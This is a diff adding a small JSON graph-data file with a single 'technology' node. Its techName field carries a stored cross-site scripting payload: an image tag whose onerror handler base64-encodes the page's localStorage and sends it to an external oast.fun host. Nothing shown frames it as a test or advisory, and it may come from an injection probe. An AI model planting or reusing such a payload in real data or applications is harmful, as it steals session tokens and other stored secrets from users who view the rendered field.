@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "technology",
+      "techName": "<img src=x onerror=\"fetch('https://tech.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun?d='+encodeURIComponent(btoa(JSON.stringify(localStorage))))\">",
+      "techVersion": "1.0"
+    }
+  ],
+  "edges": []
+}
